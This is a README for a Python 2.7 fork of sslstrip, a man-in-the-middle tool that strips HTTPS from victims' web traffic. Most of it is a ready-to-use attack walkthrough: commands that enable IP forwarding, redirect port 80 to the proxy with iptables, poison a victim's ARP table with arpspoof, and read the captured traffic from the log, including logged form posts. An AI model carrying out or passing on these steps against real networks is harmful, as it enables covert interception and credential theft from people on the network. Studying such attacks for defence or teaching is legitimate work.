# sslstrip patched to run with python 2.7

sslstrip is a MITM tool that implements Moxie Marlinspike's SSL stripping attacks.

This is a fork to make it work again with python 2.7. It requires Python 2.7, along with the `twisted`, `pyopenssl`, and `service_identity` python modules.

## Install

>This installation instructions assume that you have Python 2.7 installed and that it is the python version used by default (if it is not just change `python` to `python2` hereafter).

If you don't have `pip` for python 2 already installed, you can install it (besides distro-specific ways) with:

```console
$ curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
$ sudo python get-pip.py
```

Now you can install the python 2 module dependencies with:

```console
$ pip install twisted pyopenssl service_identity
```

And now you can clone this repo and install sslstrip

```console
$ git clone https://github.com/juanelas/sslstrip.git
$ cd sslstrip
$ sudo python setup.py install
```

> If you'd rather not install `sslstrip`, you can always run `sslstrip` from the source base by just typing `python sslstrip.py` and then the rest of options (see Usage below)

## Usage

Just run `sslstrip -h` as a non-root user to get the  command-line options.

```text
sslstrip 0.9.1 by Moxie Marlinspike (patched by Juan Hern√°ndez Serrano)
Usage: sslstrip <options>

Options:
-w <filename>, --write=<filename> Specify file to log to (optional).
-p , --post                       Log only SSL POSTs. (default)
-s , --ssl                        Log all SSL traffic to and from server.
-a , --all                        Log all SSL and HTTP traffic to and from server.
-l <port>, --listen=<port>        Port to listen on (default 10000).
-f , --favicon                    Substitute a lock favicon on secure requests.
-k , --killsessions               Kill sessions in progress.
-h                                Print this help message.
```

The six steps to getting this working (assuming you're running Linux) are:

1) Flip your machine into forwarding mode (as root).

   ```console
   $ sudo echo "1" > /proc/sys/net/ipv4/ip_forward
   ```

   > If you want to make this change persist after reboot, in Debian-like distros you could better uncomment `net.ipv4.ip_forward=1` in `/etc/sysctl.conf` and reload it with:
   >```console
   >$ sudo sysctl -p
   >```

2) Run the sslstrip transparent proxy listening at port `<yourListenPort>` (if the `-l` option is ommitted, `sslstrip` will listen on port `10000`)

   ```console
   $ sslstrip -l <yourListenPort>
   ```

3) Open a new terminal and setup `iptables` to intercept HTTP requests (port 80/tcp) and send them to your sslstrip transparent proxy:

   ```console
   $ sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port <yourListenPort>
   ```

5) Use `arpspoof` to poison the victim's ARP table so that it sends all traffic to the Internet to your machine instead of its default gateway:

   ```console
   $ sudo arpspoof -t <victimIpAddress> <routerIpAddress>
   ```

   > `arpspoof` is part of the `dsniff` suite. In Debian-like distros, if not already installed, you can install it with:
   >```console
   >$ sudo apt update && sudo apt install dsniff
   >```

6) Open a network sniffer (e.g. wireshark, tcpdump), or directly inspect the sslstrip log file (`sslstrip.log` by default), e.g. by running in other terminal
   ```console
   $ tail -f sslstrip.log
   ```
